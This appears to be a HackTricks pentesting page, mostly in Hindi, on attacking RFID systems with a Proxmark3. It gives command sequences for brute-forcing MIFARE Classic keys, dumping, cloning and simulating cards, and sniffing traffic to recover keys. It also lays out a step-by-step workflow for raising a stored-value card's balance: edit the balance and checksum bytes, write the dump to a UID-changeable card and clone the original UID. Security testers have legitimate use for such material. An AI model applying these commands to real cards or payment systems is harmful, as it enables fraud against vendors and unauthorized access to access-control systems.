# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Proxmark3 से RFID Systems पर हमला

सबसे पहले आपके पास एक [**Proxmark3**](https://proxmark.com) होना चाहिए और [**install the software and it's dependencie**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux) करना चाहिए।

### MIFARE Classic 1KB पर हमला

इसमें **16 sectors** होते हैं, प्रत्येक में **4 blocks** होते हैं और प्रत्येक block में **16B** होते हैं। UID sector 0 के block 0 में होता है और इसे बदला नहीं जा सकता।\
प्रत्येक sector तक पहुंचने के लिए आपको **2 keys** (**A** और **B**) की आवश्यकता होती है, जो प्रत्येक sector के **block 3** में stored होती हैं (sector trailer)। Sector trailer में **access bits** भी stored होते हैं, जो 2 keys का उपयोग करके **प्रत्येक block** के लिए **read और write** permissions देते हैं।\
उदाहरण के लिए, permissions देने के लिए 2 keys उपयोगी होती हैं: पहली key पता होने पर read करने और दूसरी key पता होने पर write करने की अनुमति मिलती है।

कई attacks किए जा सकते हैं<sup>[[1]](#references)</sup>।
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3 अन्य actions भी करने की अनुमति देता है, जैसे **Tag to Reader communication** को **eavesdropping** करना, ताकि sensitive data खोजने का प्रयास किया जा सके। इस card में आप communication को केवल sniff करके उपयोग की गई key की गणना कर सकते हैं, क्योंकि उपयोग किए गए **cryptographic operations** कमजोर हैं और plain तथा cipher text को जानकर आप इसकी गणना कर सकते हैं (`mfkey64` tool)।<sup>[[3]](#references)</sup>

#### MiFare Classic quick workflow for stored-value abuse

जब terminals Classic cards पर balances store करते हैं, तो सामान्य end-to-end flow इस प्रकार होता है:<sup>[[4]](#references)</sup>
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
नोट्स

- `hf mf autopwn` nested/darkside/HardNested-style attacks को orchestrate करता है, keys recover करता है और client dumps folder में dumps बनाता है।
- block 0/UID लिखना केवल magic gen1a/gen2 cards पर काम करता है। सामान्य Classic cards में UID read-only होता है।<sup>[[2]](#references)</sup>
- कई deployments में Classic "value blocks" या simple checksums का उपयोग होता है। Editing के बाद सुनिश्चित करें कि सभी duplicated/complemented fields और checksums consistent हों।

Higher-level methodology और mitigations यहां देखें:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Raw Commands

IoT systems कभी-कभी **nonbranded या noncommercial tags** का उपयोग करते हैं। इस स्थिति में, आप Proxmark3 का उपयोग करके **tags को custom raw commands भेजने** के लिए कर सकते हैं।
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
इस जानकारी के साथ आप card और उसके साथ communicate करने के तरीके के बारे में जानकारी खोजने का प्रयास कर सकते हैं। Proxmark3 इस तरह के raw commands भेजने की अनुमति देता है: `hf 14a raw -p -b 7 26`

### Scripts

Proxmark3 software में **automation scripts** की एक preloaded list आती है, जिसका उपयोग आप simple tasks करने के लिए कर सकते हैं। पूरी list प्राप्त करने के लिए `script list` command का उपयोग करें। इसके बाद, script के नाम के साथ `script run` command का उपयोग करें:
```
proxmark3> script run mfkeys
```
आप **tag readers** को **fuzz** करने के लिए एक script बना सकते हैं, इसलिए **valid card** का data copy करने के बाद, बस एक **Lua script** लिखें जो हर iteration में एक या अधिक random **bytes** को **randomize** करे और जांचे कि क्या **reader crash** होता है।

## References

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [NXP का MIFARE Classic Crypto1 पर statement](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [KioSoft Stored Value में NFC card vulnerability exploitation (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
